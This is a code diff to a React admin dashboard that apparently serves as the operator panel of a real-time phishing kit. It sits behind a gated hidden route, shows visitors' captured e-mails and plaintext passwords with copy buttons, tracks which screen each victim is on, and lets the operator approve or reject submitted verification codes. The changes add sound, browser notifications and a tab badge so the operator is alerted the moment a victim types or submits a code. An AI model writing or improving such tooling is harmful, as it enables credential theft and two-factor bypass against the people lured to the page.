@@ -9,6 +9,15 @@ import { toast } from "sonner";
 import { ADMIN_BASE, ADMIN_GATE_KEY } from "@/lib/admin-route";
 import { subscribeToOnlineVisitors } from "@/lib/presence";
 import { EmailComposerPanel } from "@/components/EmailComposerPanel";
+import {
+  ensureNotificationPermission,
+  isSoundEnabled,
+  setSoundEnabled,
+  useCountIncreaseNotifier,
+  useTitleBadge,
+} from "@/lib/notify";
+import { getScreenStyle } from "@/lib/screen-style";
+import { Volume2, VolumeX } from "lucide-react";
 
 interface LeadRow {
   id: string;
@@ -175,6 +184,31 @@ export default function Dashboard() {
     const id = setInterval(() => setNowTick(Date.now()), 60_000);
     return () => clearInterval(id);
   }, []);
+
+  /** Som ON/OFF — persistido em localStorage. */
+  const [soundOn, setSoundOnState] = useState<boolean>(() => isSoundEnabled());
+  const toggleSound = async () => {
+    const next = !soundOn;
+    setSoundOnState(next);
+    setSoundEnabled(next);
+    if (next) {
+      const ok = await ensureNotificationPermission();
+      if (ok) {
+        toast.success("Som e notificações ativados");
+      } else {
+        toast.success("Som ativado");
+      }
+    } else {
+      toast.message("Som desativado");
+    }
+  };
+  // Pede permissão de notificação automaticamente uma vez se o som já tá ligado.
+  useEffect(() => {
+    if (soundOn) void ensureNotificationPermission();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  const notifyIncrease = useCountIncreaseNotifier();
 
   // Subscreve presença global de visitantes
   useEffect(() => {
@@ -503,6 +537,23 @@ export default function Dashboard() {
     );
   }, [historyFromAttempts, staleSessions]);
 
+  // Atualiza o título da aba com (N) quando há tentativas pendentes.
+  useTitleBadge(pendingCount);
+
+  // Toca som + notifica quando NOVAS tentativas pendentes ou novas sessões em andamento aparecem.
+  useEffect(() => {
+    notifyIncrease("pending", pendingCount, {
+      title: "Nova tentativa pendente",
+      body: "Tem código aguardando aprovação no painel.",
+    });
+  }, [pendingCount, notifyIncrease]);
+  useEffect(() => {
+    notifyIncrease("active", activeSessions.length, {
+      title: "Visitante digitando",
+      body: "Alguém preencheu o e-mail e está em andamento.",
+    });
+  }, [activeSessions.length, notifyIncrease]);
+
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
     const { error } = await supabase.from("ad_session_actions").insert({
@@ -553,6 +604,20 @@ export default function Dashboard() {
             </span>
           </Link>
           <div className="flex shrink-0 items-center gap-2 sm:gap-3">
+            <Button
+              variant="ghost"
+              size="sm"
+              onClick={toggleSound}
+              className="h-9 px-2 sm:px-3"
+              title={soundOn ? "Som ligado — clique pra desligar" : "Som desligado — clique pra ligar"}
+              aria-label={soundOn ? "Desativar som" : "Ativar som"}
+            >
+              {soundOn ? (
+                <Volume2 className="h-4 w-4 text-success" />
+              ) : (
+                <VolumeX className="h-4 w-4 text-muted-foreground" />
+              )}
+            </Button>
             <Button variant="ghost" size="sm" onClick={handleSignOut} className="h-9 px-2 sm:px-3">
               <LogOut className="h-4 w-4 sm:mr-2" />
               <span className="hidden sm:inline">Sair</span>
@@ -625,7 +690,7 @@ export default function Dashboard() {
               {activeSessions.map((s) => {
                 const isOnline = activeOnlineSessionIds.has(s.session_id);
                 const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
-                const screenLabel = liveKind ? screenKindLabel(liveKind) : "—";
+                const style = getScreenStyle(liveKind);
                 return (
                   <div key={s.session_id} className="rounded-lg border border-border bg-muted/20 p-3 space-y-2">
                     <div className="flex items-center justify-between gap-2">
@@ -645,9 +710,9 @@ export default function Dashboard() {
                       </div>
                     </div>
                     <div className="flex flex-wrap items-center gap-2 pt-1">
-                      <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">
+                      <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] ${style.className}`}>
                         <Monitor className="h-3 w-3" />
-                        {screenLabel}
+                        {style.label}
                       </span>
                       <span className="text-[10px] text-muted-foreground">{deviceLabel(s.user_agent)}</span>
                     </div>
@@ -680,7 +745,7 @@ export default function Dashboard() {
                     // Tela em tempo real tem prioridade; se a sessão saiu, usa a ÚLTIMA conhecida
                     // (não inferimos pelos dados — isso causa pulos errados ao trocar de tela).
                     const liveKind = liveScreens.get(s.session_id) ?? lastKnownScreens.get(s.session_id);
-                    const screenLabel = liveKind ? screenKindLabel(liveKind) : "—";
+                    const style = getScreenStyle(liveKind);
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
@@ -696,8 +761,8 @@ export default function Dashboard() {
                           <CopyText value={s.password !== "—" ? s.password : ""} />
                         </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
-                          <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                            {screenLabel}
+                          <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 ${style.className}`}>
+                            {style.label}
                           </span>
                         </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
@@ -952,7 +1017,7 @@ function AttemptsTable({
           const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
           const isOnline = onlineSessionIds.has(row.session_id);
           const liveKind = liveScreens.get(row.session_id);
-          const screenLabel = liveKind ? screenKindLabel(liveKind) : "Tela código";
+          const style = getScreenStyle(liveKind ?? "email-code");
           return (
             <div
               key={row.key}
@@ -982,9 +1047,9 @@ function AttemptsTable({
               </div>
               <div className="flex flex-wrap items-center gap-2 pt-1">
                 {actionable && (
-                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">
+                  <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] ${style.className}`}>
                     <Monitor className="h-3 w-3" />
-                    {screenLabel}
+                    {style.label}
                   </span>
                 )}
                 <span className="text-[10px] text-muted-foreground">{deviceLabel(ua)}</span>
@@ -1063,7 +1128,7 @@ function AttemptsTable({
             const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
             const isOnline = onlineSessionIds.has(row.session_id);
             const liveKind = liveScreens.get(row.session_id);
-            const screenLabel = liveKind ? screenKindLabel(liveKind) : "Tela código";
+            const style = getScreenStyle(liveKind ?? "email-code");
             return (
               <Fragment key={row.key}>
               <tr
@@ -1090,8 +1155,8 @@ function AttemptsTable({
                 </td>
                 {actionable && (
                   <td className="whitespace-nowrap px-4 py-3 text-xs">
-                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                      {screenLabel}
+                    <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 ${style.className}`}>
+                      {style.label}
                     </span>
                   </td>
                 )}
